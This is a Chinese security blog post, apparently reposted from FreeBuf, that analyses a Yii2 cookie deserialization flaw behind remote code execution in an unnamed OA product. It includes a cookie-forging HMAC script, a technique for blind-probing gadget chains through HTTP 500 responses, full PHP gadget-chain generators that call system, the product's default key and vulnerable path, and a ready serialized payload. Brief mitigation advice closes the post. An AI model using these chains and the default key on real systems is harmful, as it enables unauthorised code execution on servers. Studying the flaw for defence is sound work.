<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CSifD9cvO2MLxrgwGzcPNw)

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

序言  

-----

近期网上流传的某达 OA 存在 PHP 反序列化漏洞，导致命令执行。因为该漏洞底层是 Yii2 框架的漏洞，所以搭建好了 Yii2 框架环境，在 Yii2 框架的环境下来进行模拟研究，希望能达到举一反三和类比分析学习的目的。该 cookie 处反序列化漏洞属于通用型漏洞，如果使用了 Yii2 框架进行应用开发，若泄露了 config/web.php 中的 cookieValidationKey 值、且符合特定 Yii2 漏洞版本以及 PHP 版本小于 7，那么可能存在此反序列化漏洞，从而导致恶意代码执行。笔者能力有限，如有理解不当之处，希望大师傅们批评指正！

一、反序列化的入口与条件
------------

### 1.hash 验证数据

我们在 cookie 处提交的参数，被送到了这个 validateData 方法处，在这里 $data 的内容会被拆分。在期间其经历了一次 hash 值校验。我们只要用它提供的加密算法和密钥进行加密，生成数据，就能通过所有的校验，然后进入我们期望的 `return $pureData;` 环节。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9FEsgIhyhSVPqFlGicPv5zQNAjmf7pthNIiaBDGEYJQN4rRwbJlNqLMzg/640?wx_fmt=jpeg)

源代码如下：

```
public function validateData($data, $key, $rawHash = false)
    {
        $test = @hash_hmac($this->macHash, '', '', $rawHash);
        if (!$test) {
            throw new InvalidConfigException('Failed to generate HMAC with hash algorithm: ' . $this->macHash);
        }
        $hashLength = StringHelper::byteLength($test);
        if (StringHelper::byteLength($data) >= $hashLength) {
            $hash = StringHelper::byteSubstr($data, 0, $hashLength);
            $pureData = StringHelper::byteSubstr($data, $hashLength, null);

            $calculatedHash = hash_hmac($this->macHash, $pureData, $key, $rawHash);

            if ($this->compareString($hash, $calculatedHash)) {
                return $pureData;
            }
        }

        return false;
    }

```

### 2.php 版本限制

上面的 validateData 方法，返回结果后，就回到了 loadCookies 方法。这里存在一个反序列化入口，就是下图 else 分支的内容，我们上一方法得到的反序列化数据会进入我们的反序列化入口（注意，allowed_classes 被设置为 false，则在反序列化过程中不会创建对象，只会还原基本数据类型，例如字符串、整数、数组等）。所以我们可以发现，在 Yii2 框架默认的环境下要进行这个反序列化操作，对 php 的版本是有所限制的，如下图，可以发现我们的版本中 PHP_VERSION_ID 要小于 70000 才能到达我们期望的反序列化入口。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9ZPjqcAibe8nvepth4wEUViax7z70z22l6n8RYuOhXsnvQewkYNH3edeA/640?wx_fmt=jpeg)

源代码如下：

```
protected function loadCookies()
    {
        $cookies = [];
        if ($this->enableCookieValidation) {
            if ($this->cookieValidationKey == '') {
                throw new InvalidConfigException(get_class($this) . '::cookieValidationKey must be configured with a secret key.');
            }
            foreach ($_COOKIE as $name => $value) {
                if (!is_string($value)) {
                    continue;
                }
                $data = Yii::$app->getSecurity()->validateData($value, $this->cookieValidationKey);
                if ($data === false) {
                    continue;
                }
                if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70000) {
                    $data = @unserialize($data, ['allowed_classes' => false]);
                } else {
                    $data = @unserialize($data);
                }
                ......
            }
        } else {
            ......
        }

        return $cookies;
    }

```

下面我们先直接展示漏洞利用结果。我们可以从调用栈看到已经在进行我们的反序列化过程了。最终弹出计算机验证确实存在此漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9lftXFVoOyEXA7oGQFm816b1vBVoj4978tGfMBOeTibYHmjvIibLmKZ5w/640?wx_fmt=jpeg)

run 方法如下：

```
public function run()
{
    if ($this->checkAccess) {
        call_user_func($this->checkAccess, $this->id);
}

```

二、config/web.php 中的 cookieValidationKey 值
-----------------------------------------

入口我们观察到了，在 validateData 方法里我们对需要对自己的反序列数据要进行一次 hash 计算，然后将 hash 值拼接到我们 url 编码后的反序列化数据前，然后附在 cookie 中发送。这里计算 hash 就需要用到我们的 cookieValidationKey 值，我们需要在 config/web.php 中搜索 cookieValidationKey 值。

例如下图中的 "demo2"：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9EAOqlzxXlTLYibvEjZvq29GxJ16KpbFMBEK8ZYMeGOea6APWRI6dfXw/640?wx_fmt=jpeg)

我们掌握了加密密钥与加密方法，也就可以编写自己想要用的反序列化数据。如下是简单编写的 cookie 加密程序：

```
<?php
//$_GET 来获取通过 GET 请求传递的参数时，PHP 会自动对这些参数进行一次 URL 解码；
$data=$_GET['data'];

$key = "demo2";
$macHash = "sha256";
$rawHash=false;

$hmac = hash_hmac($macHash, $data, $key, $rawHash);


//使用php自身的hash_hmac方法计算数据在sha256算法下的hash值；
echo "-----------------payload---------------";
$encodedata=urlencode($data);
echo '<br/>';

echo $hmac.$encodedata;

```

效果如下:

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9ehtN2aw2yibLnhNx7EZZY70aGbzU4P3A9oeib4MbrHcXJgHLTJ4BxXOA/640?wx_fmt=jpeg)

三、将反序列化数据从 cookie 中提取出来
-----------------------

从前面反序列化的入口与条件看过来，我们这里进行更为细致的研究，看看我们的反序列化数据是如何被提取出来的。下面的 $test 值可以被视作测试数据，没有什么输入，目的其实在于输出适用了 macHash 算法后加密数据的长度。这个长度被用作分割我们 cookie 里的提交的数据。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9xM8QHfcls4orSicXEb4nmeicIUicnKKKibznpRvSaeoGiaIBCtBjibj0YdvQ/640?wx_fmt=jpeg)

我们提交的是两部分，反序列化数据和在它前面的 hash_hmac 方法加密的 hash 值。由测试数据计算出的 hash 长度为 64，那么后面会将 cookie 提交的数据中的前 64 个字符赋值给 $hash，然后将剩余的赋值给 $pureData。（我需要注意，这里获取的 $data 数据会被默认 urldecode 解码一次。）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9UrIaLB1UjSeqeQ0BlmlKWJFwwYeNeqKA7cVBrnHhxEiaEAEhjXayIzw/640?wx_fmt=jpeg)

最终对比提交的 hash 值与计算出的 $pureData 的 hash 值是否一致，一致则会进入我们期望的步骤。

四、关于某些链条需要 PHPSESSID
--------------------

案例说明，有些反序列化数据需要我们添加 PHPSESSID，例如下面这条利用链：

```
yii\db\BatchQueryResult->yii\web\DbSession->yii\rest\CreatAction

```

其反序列化过程会触发对 PHPSESSID 状态的校验，含有 PHPSESSID 才能成功命令执行。先看一组对比图，第一个图添加了 PHPSESSID，则进入了 composeFields 方法；反之第二个图直接跳到结尾了，那么自然出现我们预期外的结果。如下两幅对比图：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y99JXKbcWK4ibg3m0a9waImpj2icZ4IHjrvKibTRVz7kRQxeXASqTXAyskQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9H2YicfpVvUDbPqWIP58dweqqLPNqLLibLFMpp4lWXvVUNWcUp7ULeJqA/640?wx_fmt=jpeg)

这个什么原因我们看看 getIsActive 方法:

```
public function getIsActive()
    {
        $value=session_status();
        //$value=2; PHP_SESSION_ACTIVE值为2
        return $value === PHP_SESSION_ACTIVE;
    }

```

```
define('PHP_SESSION_ACTIVE', 2);

```

如果没有 Cookie 中添加 PHPSESSID，那么我们看看图：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9cJyj3uk1grKvMCXbaGFsGhWOsia4CwaclHqOIr2BEONhfhxVrBMdAvA/640?wx_fmt=jpeg)

所以会返回 false，我们无法进入条件为 true 的语句内。

总之，反序列化链中所有会调用到 getIsActive 方法的链条，我们都需要添加 PHPSESSID。

五、通过 500 状态来判断链条存在可能
--------------------

500 状态，属于判断链条存在的一个必要条件。其会代表我们的反序列化数据所使用的类是可以调用到的，我们通过 500 状态，可以去判断目标可能存在某条利用链。我们可以从反序列化起点进行测试。（注意：通过 500 状态码来盲打，可以应对使用了不同漏洞组件的应用程序，可以辅助我们开发 POC 检测工具。所以前提是需要测试目标为存在漏洞的 Yii2 框架版本。）

判断过程如下面案例展示：

```
<?php


namespace yii\db {
    //use yii\web\DbSession;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader = "new DbSession()";
        }
    }
}

namespace {
    use yii\db\BatchQueryResult;
    $a=new BatchQueryResult();
    echo urlencode(serialize($a));
}
?>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9rgv2LJsN1SaIzWu3FvgtkyzSice8JAx66JmC4Xvp3zIHRTvsf01YAVQ/640?wx_fmt=jpeg)

返回 500，则我们可以继续测试：

```
<?php

namespace yii\web {
    //use yii\rest\CreateAction;
    class DbSession {
        protected $fields = [];
        public $writeCallback;
        public function __construct() {
            $this->writeCallback="[(new CreateAction),\"run\"]";
            $this->fields['1'] = 'aaa';
        }

    }
}

namespace yii\db {
    use yii\web\DbSession;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader = new DbSession();
        }
    }
}

namespace {
    use yii\db\BatchQueryResult;
    $a=new BatchQueryResult();
    echo urlencode(serialize($a));


}
?>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9aHrLXv54icngbECpia7y2cj4QDAGFqHg4Vp5LO6OlV60mcKBIcrH9qeA/640?wx_fmt=jpeg)

又为 500，我们继续进行 payload 测试，进行到下面的测试我们已经测试出一条链了。

```
<?php

namespace yii\rest {
    class CreateAction {
        public $checkAccess;
        public $id;
        public function __construct() {
            $this->checkAccess="system";
            $this->id="calc";
        }
    }
}

namespace yii\web {
    use yii\rest\CreateAction;
    class DbSession {
        protected $fields = [];
        public $writeCallback;
        public function __construct() {
            $this->writeCallback=[(new CreateAction),"run"];
            $this->fields['1'] = 'aaa';
        }

    }
}

namespace yii\db {
    use yii\web\DbSession;
    class BatchQueryResult {
        private $_dataReader;
        public function __construct() {
            $this->_dataReader = new DbSession();
        }
    }
}

namespace {
    use yii\db\BatchQueryResult;
    $a=new BatchQueryResult();
    echo urlencode(serialize($a));


}
?>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9L5t4go9Ywic74WEAbzJPUuaBxhzq508j4ngtFsRB3msVLBaa4HRvD3w/640?wx_fmt=jpeg)

这个思路可以用来生成我们的 payload 探测工具，可以来查找可以被利用的反序列化链条。

六、对某达 oa 的反序列化漏洞进行观察
--------------------

某达 oa 由于 /general/appbuilder/web/portal/gateway/? 这一条路径会使用上面介绍 Yii2 的 cookie 处理方法，所以就存在 Yii2 的那个反序列化入口，在获取到某达 oa 的 config/web.php 中的 cookieValidationKey 值后，我们就可以构造我们的 payload 进行攻击。在公开的 POC 中，可以观察到使用了某达 oa 自身的一个 tdAuthcode 加解密函数来加密 payload，从而可以绕过一些防御检测。

某达 oa 默认密钥 "tdide2"，使用了该密钥来加密利用链。我们在 cookie 中提交反序化数据，利用上面说的 500 状态来判断，可以判断这条链是存在的。不过 system 函数应该是被禁用了，需要使用网上公开的 POC 进行检测。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9BxxpI8yHuapA8e488hvH8Re06fLiabFZLC2ibSoSx9A3DLy0ibibPeoIqg/640?wx_fmt=jpeg)

下面是测试出的一条链条：

```
<?php

namespace yii\rest {
    class CreateAction {
        public $checkAccess;
        public $id;
        public function __construct() {
            $this->checkAccess= "system";
            $this->id = "calc";
           
        }
    }
}

namespace  yii\base{
    use yii\rest\CreateAction;
    class Component{
        private $_behaviors;
        private $_events;
        public function __construct(){
            $this->_behaviors = 1;
            $this->_events =array("afterOpen"=>array(array([(new CreateAction),"run"])));
        }
    }
}

namespace yii\redis {
    use yii\base\Component;
    class Connection extends Component{
        public $hostname;
        public $port;
        public $redisCommands;
        public $password;
        public $database;

        public $_socket;
        public function __construct() {

            $this->hostname = "127.0.0.1";
            $this->port = 135;
            $this->redisCommands = ["CLOSE CURSOR"];
     
            $this->_socket = false;
            parent::__construct($_events);
            parent::__construct($_behaviors);
        }

    }
}

namespace yii\db {
    use yii\redis\Connection;
    class DataReader {
        private $_statement;

        public function __construct() {
            $this->_statement = new Connection();
        }
    }
}
namespace yii\db {
    use yii\db\DataReader;

    class BatchQueryResult {
        public $db;
        public $query;

        public $each;
        private $_dataReader;
        


        public function __construct() {

            $this->_dataReader = new DataReader();
         
        }
    }
}



namespace {
    use yii\db\BatchQueryResult;
    $a=new BatchQueryResult();

    echo urlencode(serialize($a));

}
?>

```

序列化代码如下：

```
O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A4%3A%7Bs%3A2%3A%22db%22%3BN%3Bs%3A5%3A%22query%22%3BN%3Bs%3A4%3A%22each%22%3BN%3Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A135%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A7%3A%22_socket%22%3Bb%3A0%3Bs%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22system%22%3Bs%3A2%3A%22id%22%3Bs%3A4%3A%22calc%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D%7D%7D%7D

O:23:"yii\db\BatchQueryResult":4:{s:2:"db";N;s:5:"query";N;s:4:"each";N;s:36:"yii\db\BatchQueryResult_dataReader";O:17:"yii\db\DataReader":1:{s:29:"yii\db\DataReader_statement";O:20:"yii\redis\Connection":8:{s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:135;s:13:"redisCommands";a:1:{i:0;s:12:"CLOSE CURSOR";}s:8:"password";N;s:8:"database";N;s:7:"_socket";b:0;s:30:"yii\base\Component_behaviors";i:1;s:27:"yii\base\Component_events";a:1:{s:9:"afterOpen";a:1:{i:0;a:1:{i:0;a:2:{i:0;O:21:"yii\rest\CreateAction":2:{s:11:"checkAccess";s:6:"system";s:2:"id";s:4:"calc";}i:1;s:3:"run";\}\}\}\}\}\\}\}

```

接下来，讨论一下，`$this->redisCommands = ["CLOSE CURSOR"]; `。

因为如果我们使用 yii\redis\Connection 类来进行中转，那么 $this->redisCommands 这个参数就很关键，研究这个参数我们可以帮助我们找到其他的利用链条，所以在这里来说明一下 ["CLOSE CURSOR"]。我们观察下面，当调用栈到达 yii\db\DataReader->close() 的时候，会调用到 yii\redis\Connection 类的 closeCursor 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9V6Nh654ZKJUHU8Dv4Ec5HU4IuBN6q71pMQuUxrTDxzHWEj4gms2Fgg/640?wx_fmt=jpeg)

由于 yii\redis\Connection 类不存在 closeCursor 方法但存在__call 魔术方法，可以观察到如下传值，closeCursor 被赋值给 $name。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9QuGQC8Doicf8uu0Thwg4xNsyTEMy2wUEl0mqZic5j7cOibzRhYAzxFRBg/640?wx_fmt=jpeg)

camel2words 方法：

```
public static function camel2words($name, $ucwords = true)
    {
        $label = mb_strtolower(trim(str_replace([
            '-',
            '_',
            '.',
        ], ' ', preg_replace('/(?<!\p{Lu})(\p{Lu})|(\p{Lu})(?=\p{Ll})/u', ' \0', $name))), self::encoding());

        return $ucwords ? StringHelper::mb_ucwords($label, self::encoding()) : $label;
    }

```

直接让 ChatGPT 分析一下：

这段代码是一个 PHP 函数，用于将驼峰式命名的字符串转换为人类可读的单词组合，并可以选择是否将结果的首字母大写。下面是对代码的详细分析：

函数名称：camel2words

这个函数的名称表明它的作用是将驼峰式命名转换为单词组合。

参数：

$name：要转换的驼峰式命名的字符串。

$ucwords：一个布尔值，指示是否将结果的首字母大写（默认为 true）。

函数体：

代码的第一行定义了一个变量 $label，用于存储转换后的字符串。

mb_strtolower 函数用于将字符串转换为小写。trim 函数用于去除字符串两端的空格。

str_replace 函数用于将字符串中的一些特定字符（如短横线、下划线、点）替换为空格，以便将它们分隔开。

preg_replace 函数使用正则表达式来处理驼峰命名。它通过正则表达式将大写字母分隔开，并在它们前面添加空格，以便后续处理。

接下来的行对 $name 进行了多步的字符串处理，最终生成了一个用空格分隔的单词组合。

返回值：

如果 $ucwords 参数为 true，则调用 StringHelper::mb_ucwords 函数将转换后的单词组合中的每个单词的首字母都转换为大写，并返回结果。

如果 $ucwords 参数为 false，则直接返回转换后的小写单词组合。

总之，这个函数的作用是将驼峰式的字符串转换为人类可读的单词组合，方便展示给用户。同时，可以选择是否将结果的首字母大写，以适应不同的格式要求。注意，为了处理多字节字符，函数使用了 mb_strtolower 和 StringHelper::mb_ucwords 函数。

所以从上面的代码演示，我们可以看到，如果想使用一条其他的利用链，我们需要寻找到一条包含形如 `$this->_statement->closeCursor();` 语句的类。由于会调用 camel2words 方法来处理 yii\redis\Connection 类的__call 方法的 $name 参数，所以我们需要根据自己找到的 $name 参数，来定制 $this->redisCommands 的值，来进入我们期望的方法。（closeCursor——处理方法——> ["CLOSE CURSOR"]）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y9bULNJRkfib9hI4U8bUicFpAoToV89IQoRFppyX18QrkjI22xRAsps2Ow/640?wx_fmt=jpeg)

如果自己设置的 $name 参数能够成功通过条件语句，进入到 executeCommand 方法，后续会按照我们期望的方法顺利地进行代码执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFBicO0BElLZHhUVskuIH3Y97VCqCTwQiacCJMK4CJ5ss7JkQAdGuiauZibIkoxYia0Hia52t13qM6pSQ5A/640?wx_fmt=jpeg)

七、我们如何预防呢？
----------

*   这个漏洞，是需要知道 config/web.php 中的 cookieValidationKey 值的，这个值会被用于加密反序列化数据，所以我们要预防，就得保护好我们的 cookieValidationKey 值，避免信息泄露、默认值等这些情况导致 cookieValidationKey 值被获取。
    
*   Yii2 框架默认中要想进入反序列化利用点是需要 PHP_VERSION_ID< 70000 的，所以我们可以保证我们的系统 php 版本是较高的版本（大于 7）。
    
*   确保 Yii2 框架历史漏洞补丁被打上。
    

参考资料
----

很感谢下面大师傅们的文章，为笔者的分析学习过程解惑！

[https://mp.weixin.qq.com/s/nOQuqt_mO0glY-KALc1Xiw](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247486082&idx=1&sn=f4e73271d9c8dd97c7662c05d17101a9&scene=21#wechat_redirect)

https://www.anquanke.com/post/id/254429

```
原文地址: https://www.freebuf.com/vuls/378878.html

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


```

（部分展示）

往期推荐

[

给第一次做渗透项目的新手总结的一些感悟



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247567614&idx=1&sn=d2574a0e08aa40af7905e29d2dc87e84&chksm=ebeb81d3dc9c08c5cf67ba30beca4fb3c4eb43fe70fd3731edeb670c0c1423af3a8984c9de53&scene=21#wechat_redirect)

[

「登陆页面」常见的几种渗透思路与总结！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247552705&idx=1&sn=5921efbffcfd42b3e8d578d8f9295c60&chksm=ebea47ecdc9dcefa2c202ac765a199999ef595bc0ea9dd27fc2d5da1b92f21452a17c5c16188&scene=21#wechat_redirect)

[

突破口！入职安服后的经验之谈



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247495613&idx=1&sn=2fcfb9e0f1d47e24b634f1586ffebe8c&chksm=ebeaa690dc9d2f8638afc42a0f02a0e752a9f6d2a7bb6a3334fdb2c04dfad39914e1e913328d&scene=21#wechat_redirect)

[

红队渗透下的入口权限快速获取



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247550034&idx=1&sn=654ea58293a45c3ed5db6d4d32c9a57a&chksm=ebea4d7fdc9dc4690c21119fe028c655f6cd5f976c54c79af736064c19a47fcd99f6ff846a72&scene=21#wechat_redirect)

[

攻防演练｜红队手段之将蓝队逼到关站！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247541662&idx=1&sn=343a8d7764dde2121f6b0373aa4dbd28&chksm=ebea6ab3dc9de3a5ad1f7eadd96bd2d42375d7f4c40bd8c4ea4b4dc000415097a0e3fe0fbd38&scene=21#wechat_redirect)

[

CNVD 之 5000w 通用产品的收集 (fofa)



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543436&idx=1&sn=c0a7481697648512e9f314594b10f304&chksm=ebea63a1dc9deab7b3b07e7f692f2d83cff78a3fcc64dbfa91ec03b88eb1a4940589298ed5fd&scene=21#wechat_redirect)

[

自动化挖掘 cnvd 证书脚本



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247558287&idx=1&sn=5ed10ac4f4d34db64b722f228e3da1f5&chksm=ebebada2dc9c24b4ea13c98034bb5981ea991691c5b730ff4f83f11dadc487b941cb7a1ce7ac&scene=21#wechat_redirect)

[

Xray 捡洞中的高频漏洞



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543338&idx=1&sn=5e9785e8832acd77232cfe45944285f6&chksm=ebea6307dc9dea11f1862284f24607ce970c4e24bbafc16d6d249bedd283a4c3cf68fc41d8e2&scene=21#wechat_redirect)

[

实战｜通过供应链一举拿下目标后台权限



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543100&idx=1&sn=2d4abc345b450d41b802b419c9b2a797&chksm=ebea6011dc9de907ebc4eca7b6541df614c03a810a4263278a885700d3b06525019a4bf69577&scene=21#wechat_redirect)

[实战｜一次真实的域渗透拿下域控（内网渗透）](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247542735&idx=1&sn=1d47080088a36f8a5cafdc50ae718b0b&chksm=ebea6ee2dc9de7f461437399cec4079875f7c988eeb63eef0dc8dd77c9ed20ab33396b44218f&scene=21#wechat_redirect)

看到这里了，点个 “赞”、“再看” 吧